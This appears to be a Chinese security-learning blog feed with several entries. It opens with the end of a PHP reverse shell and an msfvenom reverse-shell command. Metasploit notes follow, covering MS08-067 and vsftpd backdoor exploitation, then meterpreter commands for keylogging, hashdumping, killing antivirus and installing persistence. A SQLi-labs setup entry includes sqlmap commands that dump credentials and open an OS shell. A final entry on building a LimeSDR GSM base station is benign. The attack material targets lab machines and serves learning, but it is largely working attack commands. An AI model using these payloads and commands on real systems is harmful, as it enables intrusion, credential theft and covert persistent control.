0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line"></span><br><span class="line">printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"></span><br><span class="line">while (1) &#123;</span><br><span class="line">// Check for end of TCP connection</span><br><span class="line">if (feof($sock)) &#123;</span><br><span class="line">printit(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Check for end of STDOUT</span><br><span class="line">if (feof($pipes[1])) &#123;</span><br><span class="line">printit(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Wait until a command is end down $sock, or some</span><br><span class="line">// command output is available on STDOUT or STDERR</span><br><span class="line">$read_a = array($sock, $pipes[1], $pipes[2]);</span><br><span class="line">$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);</span><br><span class="line"></span><br><span class="line">// If we can read from the TCP socket, send</span><br><span class="line">// data to process&apos;s STDIN</span><br><span class="line">if (in_array($sock, $read_a)) &#123;</span><br><span class="line">if ($debug) printit(&quot;SOCK READ&quot;);</span><br><span class="line">$input = fread($sock, $chunk_size);</span><br><span class="line">if ($debug) printit(&quot;SOCK: $input&quot;);</span><br><span class="line">fwrite($pipes[0], $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// If we can read from the process&apos;s STDOUT</span><br><span class="line">// send data down tcp connection</span><br><span class="line">if (in_array($pipes[1], $read_a)) &#123;</span><br><span class="line">if ($debug) printit(&quot;STDOUT READ&quot;);</span><br><span class="line">$input = fread($pipes[1], $chunk_size);</span><br><span class="line">if ($debug) printit(&quot;STDOUT: $input&quot;);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// If we can read from the process&apos;s STDERR</span><br><span class="line">// send data down tcp connection</span><br><span class="line">if (in_array($pipes[2], $read_a)) &#123;</span><br><span class="line">if ($debug) printit(&quot;STDERR READ&quot;);</span><br><span class="line">$input = fread($pipes[2], $chunk_size);</span><br><span class="line">if ($debug) printit(&quot;STDERR: $input&quot;);</span><br><span class="line">fwrite($sock, $input);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line"></span><br><span class="line">// Like print, but does nothing if we&apos;ve daemonised ourself</span><br><span class="line">// (I can&apos;t figure out how to redirect STDOUT like a proper daemon)</span><br><span class="line">function printit ($string) &#123;</span><br><span class="line">if (!$daemon) &#123;</span><br><span class="line">print &quot;$string\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里我也可以用msf生成</p><p><code>msfvenom -p php/reverse_php LHOST=192.168.50.226 LPORT=4444 -o/root/Desktop/shell123.php</code></p><p>拿到shell以后就可以查看<code>/etc/passwd</code>和 <code>/etc/shadow</code></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Metasploit基础</title>
      <link href="/2018/10/26/Metasploit%E5%9F%BA%E7%A1%80/"/>
      <url>/2018/10/26/Metasploit%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="Metasploit-技术"><a href="#Metasploit-技术" class="headerlink" title="Metasploit 技术"></a>Metasploit 技术</h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="基本模块"><a href="#基本模块" class="headerlink" title="基本模块"></a>基本模块</h3><h5 id="Auxiliaries-辅助模块"><a href="#Auxiliaries-辅助模块" class="headerlink" title="Auxiliaries(辅助模块)"></a>Auxiliaries(辅助模块)</h5><h5 id="Exploit-漏洞利用模块"><a href="#Exploit-漏洞利用模块" class="headerlink" title="Exploit(漏洞利用模块)"></a>Exploit(漏洞利用模块)</h5><h5 id="Payload-攻击载荷模块"><a href="#Payload-攻击载荷模块" class="headerlink" title="Payload(攻击载荷模块)"></a>Payload(攻击载荷模块)</h5><h5 id="Post-后期渗透模块"><a href="#Post-后期渗透模块" class="headerlink" title="Post(后期渗透模块)"></a>Post(后期渗透模块)</h5><h5 id="Encoders-编码工具模块"><a href="#Encoders-编码工具模块" class="headerlink" title="Encoders(编码工具模块)"></a>Encoders(编码工具模块)</h5><h3 id="渗透攻击步骤"><a href="#渗透攻击步骤" class="headerlink" title="渗透攻击步骤"></a>渗透攻击步骤</h3><ul><li>扫描目标系统,寻找可用漏洞</li><li>选择并配置一个漏洞利用模块</li><li>选择并配置一个攻击载荷模块</li><li>选择一个编码技术,用来绕过杀毒软件的查杀</li><li>渗透攻击</li></ul><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><h4 id="使用辅助模块进行端口扫描"><a href="#使用辅助模块进行端口扫描" class="headerlink" title="使用辅助模块进行端口扫描"></a>使用辅助模块进行端口扫描</h4><p><code>search portscan</code></p><ul><li><code>setg</code>命令和<code>unsetg</code>命令可以设置全局性的参数值,从而避免重复输入相同的值.</li></ul><h4 id="使用辅助模块进行服务扫描"><a href="#使用辅助模块进行服务扫描" class="headerlink" title="使用辅助模块进行服务扫描"></a>使用辅助模块进行服务扫描</h4><p><code>search scanner</code></p><h4 id="使用Nmap扫描"><a href="#使用Nmap扫描" class="headerlink" title="使用Nmap扫描"></a>使用Nmap扫描</h4><p>假设现在攻击一台XP MS08067漏洞主机,可以使用nmap插件.<br><code>nmap -sT -A --script=smb-vuln-ms08-067 -P0 10.10.10.152</code><br><code>-sT</code> 是指隐秘的TCP连接扫描(Stealth TCP connect)<br><code>-sS</code> 隐秘的TCP Syn扫描<br><code>-A</code>是指高级操作系统探测功能</p><h3 id="XP-ms08067-攻击过程"><a href="#XP-ms08067-攻击过程" class="headerlink" title="XP ms08067 攻击过程"></a>XP ms08067 攻击过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search ms08_067_netapi</span><br><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line">show targets</span><br><span class="line">set TARGET 6</span><br><span class="line">set RHOST 10.10.10.152</span><br><span class="line">set LHOST 10.10.10.151</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><ul><li>截屏 <code>screenshot</code></li><li><code>sysinfo</code></li><li>键盘记录 <code>run post/windows/capture/keylog_recorder</code></li><li>获取密码哈希值<br><code>use priv</code><br><code>run post/windows/gather/hashdump</code></li><li><code>ps</code>获取目标机正在运行的进程</li><li><code>getpid</code>查看Meterpreter Shell的进程号</li><li>进程迁移 <code>migrate</code> <code>run post/windows/manage/migrate</code></li><li>查看是否运行在虚拟机上 <code>run post/windows/gather/checkvm</code></li><li><code>idletime</code> 目标机最近的运行时间</li><li><code>route</code> 查看完整的网络进程</li><li><code>getuid</code> 查看已经渗透的用户名</li><li><code>run post/windows/manage/killav</code> 关闭目标机杀毒软件</li><li><code>run post/windows/manage/enable_rdp</code> 启动目标机的远程桌面协议</li><li><code>run post/windows/manage/autoroute</code> 查看目标机的本地子网情况</li><li><code>run post/windows/gather/enum_logged_on_users</code> 列举当前有多少用户登录了目标机</li><li><code>pwd</code> 或 <code>getwd</code> 查看当前处于目标机的哪个目录</li><li><code>getlwd</code> 查看当前处于本地的哪个目录</li><li><code>ls</code> 列出当前目录中的所有文件</li><li><code>cd</code> 切换目录</li><li><code>search -f *.txt -d c:\:</code> 搜索C盘中所有以txt为扩展名的文件, -f 参数用于指定搜索文件模式, -d 参数用于指定在哪个目录下进行搜索</li><li><code>download c:\test.txt /root</code> 下载目标机C盘文件到攻击机root下</li><li><code>upload /root/text.txt c:\:</code> 上传root目录下txt到目标机C盘</li><li><code>run packetrecorder -i 1</code> 查看目标机上所有流量</li><li>控制持久化 <code>run persistence -X -i 50 -p 443 -r 192.168.1.107</code></li></ul><h3 id="攻击Metasploitable2-过程"><a href="#攻击Metasploitable2-过程" class="headerlink" title="攻击Metasploitable2 过程"></a>攻击Metasploitable2 过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 10.10.10.134</span><br><span class="line">search vsftpd</span><br><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">set PAYLOAD cmd/unix/interact</span><br><span class="line">set RHOST 10.10.10.134</span><br><span class="line">exploit -z</span><br><span class="line">sessions -u 3</span><br><span class="line">sessions -i 4</span><br></pre></td></tr></table></figure><p>使用了<code>sessions -u</code> 命令将命令行shell升级为Meterpreter<br>需要使用<code>setg</code>设置LHOST和LPORT参数<br><code>exploit -z</code>命令允许在成功攻击目标后暂时不适用控制会话进行交互.</p><h3 id="跳板攻击"><a href="#跳板攻击" class="headerlink" title="跳板攻击"></a>跳板攻击</h3><h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><h4 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h4><h4 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h4>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>SQLi-lab 环境搭建</title>
      <link href="/2018/10/23/SQLi-lab/"/>
      <url>/2018/10/23/SQLi-lab/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLi-lab-环境搭建"><a href="#SQLi-lab-环境搭建" class="headerlink" title="SQLi-lab 环境搭建"></a>SQLi-lab 环境搭建</h1><p>文章参考:’<a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-ubuntu-18-04&#39;" target="_blank" rel="noopener">https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-ubuntu-18-04&#39;</a></p><p>以下只用于非生产环境使用</p><h3 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install apache2</span><br></pre></td></tr></table></figure><h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mysql-server</span><br><span class="line">sudo mysql_secure_installation</span><br></pre></td></tr></table></figure><h3 id="安装PHP"><a href="#安装PHP" class="headerlink" title="安装PHP"></a>安装PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php libapache2-mod-php php-mysql</span><br></pre></td></tr></table></figure><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vi /var/www/html/info.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://your_server_ip/info.php</code></p><p><code>sudo rm /var/www/html/info.php</code></p><h2 id="安装phpMyAdmin"><a href="#安装phpMyAdmin" class="headerlink" title="安装phpMyAdmin"></a>安装phpMyAdmin</h2><p>###安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install phpmyadmin php-mbstring php-gettext</span><br></pre></td></tr></table></figure></p><p>服务器选择apache2<br>使用dbconfig-common建立数据库<br>设置phpmyadmin的mysql密码</p><p>安装过程将phpMyAdmin Apache配置文件添加到/etc/apache2/conf-enabled/目录中，并自动读取该文件。启用mbstringPHP扩展.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo phpenmod mbstring</span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure></p><p>创建phpMyAdmin快捷方式：sudo ln -s /usr/share/phpmyadmin /var/www/html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">要以root用户身份登录phpMyAdmin ，您需要将其身份验证方法切换为auth_socket，mysql_native_password如果您还没有这样做。为此，请从终端打开MySQL提示符：</span><br><span class="line"></span><br><span class="line">sudo mysql</span><br><span class="line">接下来，使用以下命令检查每个MySQL用户帐户使用的身份验证方法：</span><br><span class="line"></span><br><span class="line">SELECT user,authentication_string,plugin,host FROM mysql.user;</span><br><span class="line">Output</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| user             | authentication_string                     | plugin                | host      |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| root             |                                           | auth_socket           | localhost |</span><br><span class="line">| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| debian-sys-maint | *8486437DE5F65ADC4A4B001CA591363B64746D4C | mysql_native_password | localhost |</span><br><span class="line">| phpmyadmin       | *5FD2B7524254B7F81B32873B1EA6D681503A5CA9 | mysql_native_password | localhost |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line">在此示例中，您可以看到root用户确实使用auth_socket插件进行身份验证。要配置root帐户以使用密码进行身份验证，请运行以下ALTER USER命令。请务必更改password为您选择的强密码：</span><br><span class="line"></span><br><span class="line">ALTER USER &apos;root&apos;@&apos;localhost&apos; IDENTIFIED WITH mysql_native_password BY &apos;password&apos;;</span><br><span class="line">然后，运行FLUSH PRIVILEGES告诉服务器重新加载授权表并使您的新更改生效：</span><br><span class="line"></span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">再次检查每个用户使用的身份验证方法，以确认root用户不再使用该auth_socket插件进行身份验证：</span><br><span class="line"></span><br><span class="line">SELECT user,authentication_string,plugin,host FROM mysql.user;</span><br><span class="line">Output</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| user             | authentication_string                     | plugin                | host      |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">| root             | *DE06E242B88EFB1FE4B5083587C260BACB2A6158 | mysql_native_password | localhost |</span><br><span class="line">| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | mysql_native_password | localhost |</span><br><span class="line">| debian-sys-maint | *8486437DE5F65ADC4A4B001CA591363B64746D4C | mysql_native_password | localhost |</span><br><span class="line">| phpmyadmin       | *5FD2B7524254B7F81B32873B1EA6D681503A5CA9 | mysql_native_password | localhost |</span><br><span class="line">+------------------+-------------------------------------------+-----------------------+-----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line">您可以从此输出中看到root用户将使用密码进行身份验证。您现在可以使用您在此处为其设置的密码以root用户身份登录phpMyAdmin界面。</span><br></pre></td></tr></table></figure><p>因为sqli-lab年代久远的关系,应该只支持到PHP5的版本.现在有两种办法解决,一种是直接将PHP降级,一种是使用修改过的版本.<code>https://github.com/Rinkish/Sqli_Edited_Version</code><br><code>http://www.hackingarticles.in/set-sqli-lab-kali/</code></p><p>后来还发现一种简单的办法,就是直接使用Docker.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/2ad3edf3c61f</span><br><span class="line">sudo apt-get update#更新软件库</span><br><span class="line">sudo apt install docker-ce#安装docker-ce</span><br><span class="line">sudo docker version#查看是否安装成功</span><br><span class="line">docker search sqli-labs #搜索镜像</span><br><span class="line">docker pull acgpiano/sqli-labs #选择了acgpiano</span><br><span class="line">#大写代表的是预定义可替换</span><br><span class="line">docker run -dt --name NAME -p PORT:80 --rm  acgpiano/sqli-labs</span><br><span class="line">#run 创建一个新的容器并运行一个命令</span><br><span class="line">#-d 表示后台运行,返回容器id</span><br><span class="line">#-t  为容器重新分配一个伪输入终端，通常与 -i 同时使用</span><br><span class="line">#--name NAME 将容器命名为NAME</span><br><span class="line">#-p PORT:80  将acgpiano/sqli-labs的80端口映射到本地的PORT端口</span><br><span class="line">docker ps#查看正在运行的容器</span><br><span class="line">docker ps -a#查看所有容器</span><br><span class="line">docker exec -it ID /bin/bash</span><br><span class="line">#exec 在运行的容器中执行命令</span><br><span class="line">#-t 分配一个伪终端</span><br><span class="line">#-i 即使没有附加也保持STDIN</span><br><span class="line">cd /var/www/html #进入网站放置目录</span><br><span class="line">mysql -u root -p #进入mysql,默认密码为空</span><br><span class="line">docker images #列出本地镜像</span><br><span class="line">docker start CONTAINER #启动一个或多少已经被停止的容器</span><br><span class="line">docker stop CONTAINER #停止一个运行中的容器</span><br><span class="line">docker restart CONTAINER #重启容器</span><br><span class="line">docker rm CONTAINER #删除容器</span><br><span class="line">docker rmi IMAGE #删除镜像</span><br><span class="line">sudo systemctl daemon-reload #reload daemon.json</span><br><span class="line">sudo systemctl restart docker #重启docker</span><br></pre></td></tr></table></figure></p><h2 id="使用-SQLMap"><a href="#使用-SQLMap" class="headerlink" title="使用 SQLMap"></a>使用 SQLMap</h2><h4 id="入个门"><a href="#入个门" class="headerlink" title="入个门"></a>入个门</h4><ul><li><p>判断是否存在注入<br><code>python sqlmap.py -u &#39;http://10.10.10.153/sql1/Less-1/?id=8&quot;</code></p></li><li><p>判断文本请求是否存在注入<br><code>sqlmap.py -r 1.txt</code></p></li><li><p>查询当前用户下的所有数据库<br><code>python sqlmap.py -u &#39;http://10.10.10.153/sql1/Less-1/?id=8&quot; --dbs</code><br><code>--dbs</code>可以缩写为<code>-D</code></p></li><li><p>获取数据库中的表名<br><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; -D security --tables</code></p></li><li><p>获取表中的字段名<br><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; -D security -T users --columns</code></p></li><li><p>获取字段内容<br><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; -D security -T users -C username,password --dump</code></p></li><li><p>获取数据库的所有用户<br><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --users</code></p></li><li><p>获取数据库用户的密码<br><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --passwords</code></p></li><li><p>获取当前网站数据库名称<br><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --current-db</code></p></li><li><p>获取当前数据库的用户名称</p><p><code>python sqlmap.py -u &quot;http://10.10.10.153/sql1/Less-1/?id=8&quot; --current-user</code></p></li><li><p><code>--level 5</code> 探测等级</p></li><li><p><code>--is-dba</code> 当前用户是否为管理权限</p></li><li><p><code>--roles</code> 列出数据库管理员角色</p></li><li><p><code>--referer</code> HTTP Referer头</p></li><li><p><code>--sql-shell</code> 运行自定义SQL语句</p></li><li><p><code>--os-cmd, --os-shell</code> 运行任意操作系统命令</p></li><li><p><code>--fire-read</code> 从数据库服务器中读取文件</p></li><li><p><code>--file-write --file-dest</code> 上传文件到数据库服务器中 </p></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>基于LimeSDR的GSM网络搭建</title>
      <link href="/2018/07/17/%E5%9F%BA%E4%BA%8ELimeSDR%E7%9A%84GSM%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/"/>
      <url>/2018/07/17/%E5%9F%BA%E4%BA%8ELimeSDR%E7%9A%84GSM%E7%BD%91%E7%BB%9C%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>这篇是记录怎么搭建简易GSM基站的，过程很复杂。搞了很长时间，现在慢慢整理一下。理一下思路。</p><p>首先是看到这个<code>http://osmocom.org/projects/osmobts/wiki/Wiki</code></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>因为驱动的复杂性，必须从零开始。准备一个xubuntu16.04的全新虚拟机。<br>理论上的安装顺序是（UHD，SoapySDR,SoapyUHD,LimeSuite)<br>但是我不是这样装的，等会儿会提到。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先根据这个页面<code>https://osmocom.org/projects/osmotrx/wiki/LimeSDR_Build_From_Source</code><br>进行安装，但其中某些操作要改变，否则会出问题。</p><h4 id="LimeSuite-UHD-SoapyUHD-依赖"><a href="#LimeSuite-UHD-SoapyUHD-依赖" class="headerlink" title="LimeSuite UHD SoapyUHD 依赖"></a>LimeSuite UHD SoapyUHD 依赖</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository -y ppa:myriadrf/drivers</span><br><span class="line">sudo apt-get update</span><br><span class="line"></span><br><span class="line">#install core library and build dependencies</span><br><span class="line">sudo apt-get install git g++ cmake libsqlite3-dev </span><br><span class="line"></span><br><span class="line">#install hardware support dependencies</span><br><span class="line">sudo apt-get install libsoapysdr-dev libi2c-dev libusb-1.0-0-dev gnuplot</span><br><span class="line"></span><br><span class="line">#install graphics dependencies</span><br><span class="line">sudo apt-get install libwxgtk3.0-dev freeglut3-dev</span><br></pre></td></tr></table></figure><h4 id="Install-LimeSuite"><a href="#Install-LimeSuite" class="headerlink" title="Install LimeSuite"></a>Install LimeSuite</h4><p>这里出现问题，不能安装最新版的LimeSuite以及硬件驱动。否则会出问题，类似于这样<code>osmo-trx: symbol lookup error: osmo-trx: undefined symbol: _ZN3uhd3msg16register_handlerERKPFvNS0_6type_tERKNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEEE</code><br>原因是新版的驱动将device name 从 STREAM 变成了 FX3 所导致的问题。<br>解决办法是下载旧版本的LimeSuite,进行安装，更新成旧版本的驱动。<br>我就从github找到了17.12版本，进行安装。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd LimeSuite</span><br><span class="line">mkdir builddir &amp;&amp; cd builddir</span><br><span class="line">cmake ../</span><br><span class="line">make -j4</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">cd LimeSuite/udev-rules</span><br><span class="line">sudo sh ./install.sh</span><br></pre></td></tr></table></figure></p><h4 id="Install-UHD"><a href="#Install-UHD" class="headerlink" title="Install UHD"></a>Install UHD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install git swig cmake doxygen build-essential libboost-all-dev libtool libusb-1.0-0 libusb-1.0-0-dev libudev-dev libncurses5-dev libfftw3-bin libfftw3-dev libfftw3-doc libcppunit-1.13-0v5 libcppunit-dev libcppunit-doc ncurses-bin cpufrequtils python-numpy python-numpy-doc python-numpy-dbg python-scipy python-docutils qt4-bin-dbg qt4-default qt4-doc libqt4-dev libqt4-dev-bin python-qt4 python-qt4-dbg python-qt4-dev python-qt4-doc python-qt4-doc libqwt6abi1 libfftw3-bin libfftw3-dev libfftw3-doc ncurses-bin libncurses5 libncurses5-dev libncurses5-dbg libfontconfig1-dev libxrender-dev libpulse-dev swig g++ automake autoconf libtool python-dev libfftw3-dev libcppunit-dev libboost-all-dev libusb-dev libusb-1.0-0-dev fort77 libsdl1.2-dev python-wxgtk3.0 git-core libqt4-dev python-numpy ccache python-opengl libgsl-dev python-cheetah python-mako python-lxml doxygen qt4-default qt4-dev-tools libusb-1.0-0-dev libqwt5-qt4-dev libqwtplot3d-qt4-dev pyqt4-dev-tools python-qwt5-qt4 cmake git-core wget libxi-dev gtk2-engines-pixbuf r-base-dev python-tk liborc-0.4-0 liborc-0.4-dev libasound2-dev python-gtk2 libzmq-dev libzmq1 python-requests python-sphinx libcomedi-dev python-zmq</span><br><span class="line"></span><br><span class="line">git clone https://github.com/EttusResearch/uhd</span><br><span class="line">cd uhd</span><br><span class="line"></span><br><span class="line">git tag -l</span><br><span class="line">...</span><br><span class="line">release_003_009_004</span><br><span class="line">release_003_009_005</span><br><span class="line">release_003_010_000_000</span><br><span class="line"># Example: For UHD 3.10.000.000: </span><br><span class="line">  git checkout release_003_010_000_000 (get the latest if fine)</span><br><span class="line"></span><br><span class="line">cd host</span><br><span class="line">mkdir build</span><br><span class="line">cd build </span><br><span class="line">cmake ../</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=/usr/local/lib</span><br></pre></td></tr></table></figure><h4 id="Install-SoapySDR-and-SoapyUHD"><a href="#Install-SoapySDR-and-SoapyUHD" class="headerlink" title="Install SoapySDR and SoapyUHD"></a>Install SoapySDR and SoapyUHD</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pothosware/SoapySDR.git</span><br><span class="line">cd SoapySDR</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br><span class="line"></span><br><span class="line">git clone https://github.com/pothosware/SoapyUHD</span><br><span class="line">cd SoapyUHD</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">cmake ..</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><p>到这里之后，运行<code>uhd_find_devices</code>是找不到设备的，是因为我们安装顺序的关系，这时候重新安装一次LimeSuite即可。主要要更新固件，方法是打开LimeSuiteGUI-Modules-Programming-Program.</p><h4 id="Install-libosmocore"><a 